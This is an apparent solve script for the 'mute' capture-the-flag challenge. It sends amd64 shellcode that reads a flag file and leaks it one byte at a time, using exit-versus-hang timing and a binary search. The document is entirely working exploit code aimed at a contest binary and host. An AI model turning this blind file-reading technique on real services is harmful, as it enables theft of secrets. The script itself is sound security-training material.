#!/usr/bin/env python # -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"
context.timeout = 4

def smaller(i, c):
    try:
        if "remote" in sys.argv:
            r = remote("mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me", 443)
        else:
            r = process("./mute")

        r.recvline()
        sc = asm("""
            jmp F

        open:
            mov rax, SYS_open
            pop rdi
            xor rsi, rsi
            xor rdx, rdx
            syscall

            mov rdi, rax
            push rax
            mov rsi, 0x601098
            mov rax, SYS_read
            mov rdx, 0x1000
            syscall
            
            pop rdi
            mov rax, SYS_close
            syscall

            mov al, byte ptr[%s]
            cmp al, %s
            jg kill
            
        inf:
            jmp inf

        kill:
            mov rax, 60
            syscall

        F:
            call open
            .asciz "./flag"
        """ % (hex(0x601098+i), hex(c)))

        r.send(sc.ljust(4096))
        r.recv(1)
        r.close()
        return 1
    except EOFError:
        r.close()
        return 0

def equal(i, c):
    try:
        if "remote" in sys.argv:
            r = remote("mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me", 443)
        else:
            r = process("./mute")

        r.recvline()
        sc = asm("""
            jmp F

        open:
            mov rax, SYS_open
            pop rdi
            xor rsi, rsi
            xor rdx, rdx
            syscall

            mov rdi, rax
            push rax
            mov rsi, 0x601098
            mov rax, SYS_read
            mov rdx, 0x1000
            syscall

            pop rdi
            mov rax, SYS_close
            syscall
            mov al, byte ptr[%s]
            cmp al, %s
            jne kill
            
        inf:
            jmp inf

        kill:
            mov rax, 60
            syscall

        F:
            call open
            .asciz "./flag"
        """ % (hex(0x601098+i), hex(c)))

        r.send(sc.ljust(4096))
        r.recv(1)
        r.close()
        return 1
    except EOFError:
        r.close()
        return 0

def bseach(i):
    min, max = 0x20, 0x7e
    while min <= max:
        print "%d - %d" % ( min, max)
	if min == max:
            return chr(min)
        mid = (min + max) / 2
        print "try %d..." % mid
        if equal(i, mid):
            print "Found[%d]: [%c]" % (i,mid)
            return chr(mid)
        elif smaller(i, mid):
            log.info("smaller")
            max = mid - 1
        else:
            min = mid + 1

out = "I thought what I’d do was, I’d pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e637901fa"
for i in range(len(out), 116):
    out += bseach(i)
    print out

